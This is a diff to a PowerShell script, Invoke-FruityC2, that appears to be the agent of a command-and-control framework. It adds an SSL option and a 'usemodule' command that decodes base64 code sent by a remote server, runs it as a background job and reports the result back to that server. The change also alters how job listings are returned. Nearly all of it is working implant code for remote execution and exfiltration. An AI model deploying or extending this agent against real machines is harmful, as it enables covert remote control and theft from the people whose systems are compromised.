@@ -50,6 +50,7 @@ function Invoke-FruityC2 {
 
     $r_server = $r_server
     $r_port = $r_port
+    $r_ssl = $r_ssl
 
     function b64encoder($output) {
         $b = [System.Text.Encoding]::UTF8.GetBytes($output)
@@ -603,6 +604,26 @@ function Invoke-FruityC2 {
                         Send-Data -param "$output"
                     }
 
+                    # EXEC USEMODULE [JOB]
+                    ElseIf ($exec_command.StartsWith("usemodule")){
+                        echo "COMMAND: usemodule"
+                        
+                        # DECODE AND EXEC COMAND
+                        $exec_data = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_data)) # ENCODED
+                        if ($exec_import -ne "") {
+                            $job_name = Start-AgentJob -data ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($exec_import)) + " ; $exec_data ")
+                        } else {
+                            $job_name = Start-AgentJob -data ($exec_data)
+                        }
+
+                        $output = tx_data("Job Started [usemodule]: $job_name") # ENCRYPT/ENCODE DATA TO TRANSFER
+                        #Send-Data -param "send=$output"
+                        Send-Data -param "$output"
+
+                        Get-Job
+
+                    }
+
                     # EXIT 
                     ElseIf ($exec_command -eq ("exit")){
                         echo "EXIT..."
@@ -620,7 +641,7 @@ function Invoke-FruityC2 {
 
                     ElseIf ($exec_command -eq ("jobs")){
                     
-                        $output = Get-Job
+                        $output = Get-Job | Out-String
 
                         echo $output # DEBUG
 
@@ -655,4 +676,5 @@ function Invoke-FruityC2 {
     }
     echo "Bye Bye ;)"
 }
-#Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx"
+#Invoke-FruityC2 -r_server "x.x.x.x" -r_port "xx" -r_ssl = ""
+
